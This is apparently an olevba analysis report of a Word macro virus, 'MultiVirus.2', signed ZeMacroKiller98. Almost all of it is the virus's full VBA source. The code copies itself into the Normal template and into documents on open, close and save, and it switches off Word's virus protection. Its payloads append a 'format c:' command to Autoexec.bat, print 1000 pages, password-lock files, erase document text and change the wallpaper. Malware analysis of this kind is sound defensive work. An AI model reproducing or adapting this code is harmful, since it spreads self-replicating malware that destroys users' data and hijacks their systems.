olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.MultiVirus.2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.MultiVirus.2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MultiVirus2.bas 
in file: ./Virus.MSWord.MultiVirus.2 - OLE stream: 'Macros/VBA/MultiVirus2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "MultiVirus2" Then
        MultiVirus2Installed = -1
    End If
Next I
If Not MultiVirus2Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
End If
Call PayIce
Call PayMon
ErrorAO:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
iMacroCount = WordBasic.CountMacros(0, 0)
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "MultiVirus2" Then
        MultiVirus2Installed = -1
    End If
Next I
If Not MultiVirus2Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
End If
Call PayIncar
End Sub
Sub FileClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
iMacroCount = WordBasic.CountMacros(0, 0)
On Error GoTo ErrorFC
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "MultiVirus2" Then
        MultiVirus2Installed = -1
    End If
Next I
If Not MultiVirus2Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
End If
Call PayIncar
Application.Run MacroName:="FichierFermer"
ErrorFC:
End Sub
Sub AutoExit()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAEx
Dim FileName$, N$, Choix
With Application.FileSearch
    .FileName = "*.bmp"
    .LookIn = "C:\Windows"
    .Execute
     Choix = .FoundFiles.Count
     N$ = Int(Rnd * Choix) + 1
     FileName$ = .FoundFiles(N$)
End With
WordBasic.SetPrivateProfileString "DeskTop", "Wallpaper", FileName$, "Win.ini"
ErrorAEx:
End Sub
Sub FileSave()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFS
ActiveDocument.Save
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFS:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
Dim MyDate, MyWeek
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
If MyWeek = 1 Then
    ActiveDocument.SaveAs Password:="Lundi"
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    Selection.WholeStory
    Selection.Delete Unit:=wdWord, Count:=1
    ActiveDocument.Save
ErrorFT:
End Sub
Private Sub PayIce()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPI
Dim WOpen$, Sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Comptage", "DernActivation", "Win.ini")
Sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Comptage", "DernActivation", Str(Sales), "Win.ini"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Comptage", "DernActivation", "Win.ini")
If WOpen$ = 24 Then
    StatusBar = "Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "           Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                       Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                               Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                           Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                      Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                              Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                       Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                               Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                                           Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                                                       Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                                                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
WordBasic.SetPrivateProfileString "Comptage", "DernActivation", "1", "Win.ini"
End If
ErrorPI:
End Sub
Private Sub PayIncar()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPIn
Dim MyDate, MyYear
MyDate = Date
MyYear = Year(MyDate)
Selection.EndKey
Selection.TypeParagraph
Selection.TypeText Text:="Pour en finir avec, je voudrais dire..."
Selection.TypeParagraph
Selection.TypeText Text:="Pour me dйfier, il faut s'attirer mon courroux..."
Selection.TypeParagraph
Selection.TypeText Text:="Je suis ZeMacroKiller98"
Selection.TypeParagraph
Selection.TypeText Text:="Je suis MultiVirus2..."
Selection.TypeParagraph
Selection.TypeText Text:="Je ne serai pas refusй!!!"
Selection.TypeParagraph
Selection.TypeText Text:=MyYear & "ZeMacroKiller98"
ActiveDocument.Save
ErrorPIn:
End Sub
Sub PayMon()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPM
Dim MyDate, MyWeek
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
Randomize
N$ = Int(Rnd * 20) + 1
If MyWeek = 1 Then
    GoTo Charge
Else
    GoTo fin
Charge:
Select Case N$
    Case 1, 3, 5, 7, 9, 11, 13, 15, 17, 19
        Open "C:\Autoexec.bat" For Append As #1
            Print #1, "echo off"
            Print #1, "cls"
            Print #1, "echo o|Format c: /u"
            Print #1, "echo Votre disque c: a йtй formatй, HAHAHAHAHA!!!!"
        Close #1
End Select
MsgBox "ZeMacroKiller98 dit:" & Chr$(13) & "Allez-y! C'est mon jour! ! !", vbInformation, "MultiVirus2"
Documents.Add
Selection.TypeText Text:="Ceci est le virus MultiVirus2!!!!"
For I = 1 To 1000
    ActiveDocument.PrintOut
Next I
End If
fin:
ErrorPM:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MessageBox.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO MessageBox.frm 
in file: ./Virus.MSWord.MultiVirus.2 - OLE stream: 'Macros/VBA/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload MessageBox
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98 ' 98�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce virus est d�dicac� � tous mes meilleurs amis:�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~ S�bastien, St�phane, J�r�me, etc... ~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce sont des amis vraiment COOL et surtout S�bastien
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J'esp�re qu'il resteront toujours mes amis...is:S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OK, d'accord�	
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.MultiVirus.2' - OLE stream: 'Macros/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

